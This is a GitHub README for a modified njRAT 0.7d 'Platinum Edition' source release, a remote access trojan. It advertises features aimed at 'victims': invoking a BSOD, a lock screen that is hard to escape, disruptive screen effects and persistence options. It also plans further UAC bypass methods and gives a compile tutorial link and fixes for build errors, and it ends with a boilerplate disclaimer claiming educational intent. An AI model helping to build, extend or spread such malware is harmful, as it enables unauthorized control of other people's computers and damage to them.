# njRAT 0.7d Platinum Edition
  
<img src=https://img.shields.io/github/repo-size/ChimesOfDestruction/SRC-njRAT-0.7d-Platinum-Edition alt="Repo Size"> ![GitHub last commit](https://img.shields.io/github/last-commit/ChimesOfDestruction/SRC-njRAT-0.7d-Platinum-Edition)
  
### Latest Updates:  
* New option to invoke a BSOD from usermode using ntraiseharderror.
* Sort out the mostly unusued options and put them into the Persistence category.
* Make the lock screen hard to escape by minimizing any application that tries to get over it.
* Fix the pastebin DNS crashing, instead it will continue retrying.
* 4 new GDI+ effects:
* Draw a full rainbow gradient to the victims  screen.
* Draw a spooky face to a random position on the victims  screen.
* Draw some crazy lines all over the victims screen.
* Draw System Icons all over the victims screen.
 
### TODO:
* Add more UAC Bypass methods (fodhelper, cmstp)
* Feel free to suggest improvements/features in Issues tab.  

  
##### Compile njRAT & Stub Tutorial:  
https://user-images.githubusercontent.com/127018596/227810792-79b2c8e8-f7f3-4ee5-b429-0b0bb02b619a.mp4
##### Full showcase on Windows 10 Victim:  
Being revised...  
⠀  
### Common compile errors:  

#### If you edit certain forms you will sometimes run into errors:  
  
Type 'NJRAT.L1' is not defined  
Type 'NJRAT.Pp1' is not defined  
Type 'NJRAT.Gclass9' is not defined  
  
#### These will happen during compiling, to fix them, follow this:

Change
```
Me.L1 = New NJRAT.L1()
  
Me.Pp1 = New NJRAT.Pp1()
```
To
```
Me.L1 = New L1()
  
Me.Pp1 = New Pp1()
```
  
After this, compile again and it should be fixed.
  
###### I am not responsible for any actions and or damages caused by this software. You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only. This software's intended purpose is NOT to be used maliciously, or on any system that you do not have own or have explicit permission to operate and use this program on.
